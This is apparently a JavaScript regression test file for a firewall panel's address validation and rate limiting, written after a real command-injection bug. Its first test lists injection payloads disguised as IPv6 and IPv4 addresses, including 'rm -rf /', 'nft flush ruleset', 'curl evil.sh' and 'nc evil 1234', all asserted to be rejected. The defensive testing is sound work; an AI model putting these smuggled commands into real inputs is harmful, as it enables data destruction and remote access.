import { test } from 'node:test';
import assert from 'node:assert/strict';
import { splitCidr, isIpv6, preflight } from './firewall.js';
import { consume, resetRateLimits } from './ratelimit.js';

/*
 * 安全回归。
 *
 * 这些用例对应的是真实修过的问题，不是假想威胁：
 * 早先 isIpv6 只判断"含不含冒号"，于是 `::1; whoami` 能一路通过预检，
 * 被拼进面板展示的 nft 命令里。agent 那边不过 shell 所以没被利用，
 * 但面板配了「复制命令」按钮，粘进终端就成立了。
 */

const ctx = { nodeIp: '10.0.0.1', operatorIp: '10.0.0.2', panelIp: '10.0.0.3', allowlist: [] };

test('命令注入：带分号的伪 IPv6 必须被拒', () => {
  const payloads = [
    '::1; whoami',
    '::1 }; rm -rf /; nft add element inet sonar blocklist6 { ::2',
    '2001:db8::1 && curl evil.sh',
    '::1\nnft flush ruleset',
    '::1`id`',
    '::1$(id)',
    '::1|nc evil 1234',
  ];
  for (const p of payloads) {
    assert.equal(splitCidr(p), null, `splitCidr 放行了：${JSON.stringify(p)}`);
    const r = preflight(p, 'dry-run', 3600, ctx);
    assert.equal(r.allowed, false, `preflight 放行了：${JSON.stringify(p)}`);
    assert.deepEqual(r.commands, [], `不该为非法目标生成命令：${JSON.stringify(p)}`);
  }
});

test('命令注入：IPv4 侧同样不能带壳字符', () => {
  for (const p of ['1.2.3.4; id', '1.2.3.4 && id', '1.2.3.4/24/8', '1.2.3.4 ', ' 1.2.3.4']) {
    const r = preflight(p, 'dry-run', 3600, ctx);
    assert.equal(r.allowed, false, `preflight 放行了：${JSON.stringify(p)}`);
  }
});

test('合法地址仍然放行', () => {
  for (const good of ['1.2.3.4', '203.0.113.0/24', '2001:db8::1', '2001:db8::/64', '::ffff:1.2.3.4']) {
    assert.notEqual(splitCidr(good), null, `合法地址被误拒：${good}`);
  }
  const r = preflight('203.0.113.5', 'dry-run', 3600, ctx);
  assert.equal(r.allowed, true, r.blockers.join('; '));
  assert.ok(r.commands.some((c) => c.includes('203.0.113.5')));
});

test('isIpv6 只认真正的 IPv6', () => {
  assert.equal(isIpv6('2001:db8::1'), true);
  assert.equal(isIpv6('::1'), true);
  assert.equal(isIpv6('::1; whoami'), false, '含冒号不等于是 IPv6');
  assert.equal(isIpv6('1.2.3.4'), false);
  assert.equal(isIpv6('hello:world'), false);
});

test('生成的命令里不含 shell 元字符', () => {
  const r = preflight('2001:db8::dead:beef', 'enforced', 3600, ctx);
  assert.equal(r.allowed, true, r.blockers.join('; '));
  for (const cmd of r.commands) {
    // 反引号、$()、管道、重定向、换行：任意一个出现都说明有东西漏进来了
    assert.ok(!/[`$|><\n]/.test(cmd), `命令含危险字符：${cmd}`);
    // 分号在 nft 语法里是转义过的 \\; ，不该出现裸分号
    assert.ok(!/[^\\];/.test(cmd), `命令含裸分号：${cmd}`);
  }
});

test('自伤守卫：不能封自己和面板', () => {
  for (const target of ['10.0.0.1', '10.0.0.2', '10.0.0.3']) {
    const r = preflight(target, 'dry-run', 3600, ctx);
    assert.equal(r.allowed, false, `${target} 应该被守卫拦住`);
  }
});

test('限流：超过阈值即拒绝，窗口过后恢复', () => {
  resetRateLimits();
  const key = 'test:1.2.3.4';
  for (let i = 0; i < 5; i++) {
    assert.equal(consume(key, 5, 1000), true, `第 ${i + 1} 次不该被拦`);
  }
  assert.equal(consume(key, 5, 1000), false, '第 6 次应该被拦');
  // 不同 key 互不影响
  assert.equal(consume('test:5.6.7.8', 5, 1000), true);
});
